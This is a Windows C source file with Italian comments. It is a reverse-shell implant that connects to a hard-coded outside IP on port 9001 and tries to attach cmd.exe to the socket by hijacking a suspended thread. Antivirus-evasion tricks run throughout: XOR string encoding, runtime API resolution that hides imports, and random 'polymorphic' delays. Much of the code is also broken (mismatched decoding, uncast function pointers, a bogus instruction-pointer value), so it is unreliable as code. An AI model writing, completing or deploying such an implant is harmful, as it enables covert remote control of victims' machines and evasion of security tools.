#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <time.h>
#pragma comment(lib, "ws2_32.lib")

// XOR key per stringhe
#define XOR_KEY 0xAA

// Decodifica stringhe XOR
void xdecrypt(char* str, int len) {
    for(int i=0; i<len; i++) str[i] ^= XOR_KEY;
}

// IP/Porta codificati XOR (modifica questi!)
unsigned char ip_enc[] = {0x97^XOR_KEY,0x3D^XOR_KEY,0xCE^XOR_KEY,0xC9^XOR_KEY}; // 151.61.206.201
unsigned short port_enc = 0x2329 ^ XOR_KEY; // 9001

// Sleep casuale polimorfico
void random_delay() {
    Sleep(2000 + (rand() % 5000)); // 2-7 secondi random
}

// API hashing per dynamic resolution (evita import table)
FARPROC get_proc(HMODULE mod, const char* name) {
    char n[256]; memcpy(n, name, strlen(name)+1);
    xdecrypt(n, strlen(name));
    return GetProcAddress(mod, n);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    srand((unsigned)time(NULL));
    
    // Delay iniziale polimorfo
    random_delay();
    
    // XOR decrypt IP
    xdecrypt((char*)ip_enc, 4);
    
    WSADATA wsadata;
    get_proc(GetModuleHandleA("ws2_32.dll"), "WSAStartup")(MAKEWORD(2,2), &wsadata);
    
    SOCKET sock = get_proc(GetModuleHandleA("ws2_32.dll"), "socket")(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    struct sockaddr_in server = {0};
    server.sin_family = AF_INET;
    server.sin_port = *(unsigned short*)get_proc(GetModuleHandleA("ws2_32.dll"), "htons")(port_enc);
    memcpy(&server.sin_addr, ip_enc, 4);
    
    get_proc(GetModuleHandleA("ws2_32.dll"), "connect")(sock, (struct sockaddr*)&server, sizeof(server));
    
    // Crea processo sospeso
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    
    char cmd[] = {'c','m','d','.','e','x','e',0};
    xdecrypt(cmd, 7);
    
    get_proc(GetModuleHandleA("kernel32.dll"), "CreateProcessA")(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // Thread hijacking: inietta shellcode nel thread sospeso
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    get_proc(GetModuleHandleA("kernel32.dll"), "GetThreadContext")(pi.hThread, &ctx);
    
    ctx.Eax = sock; // Passa socket via EAX
    ctx.Eip = (DWORD)get_proc(GetModuleHandleA("kernel32.dll"), "ResumeThread")(pi.hThread);
    
    get_proc(GetModuleHandleA("kernel32.dll"), "SetThreadContext")(pi.hThread, &ctx);
    
    return 0;
}
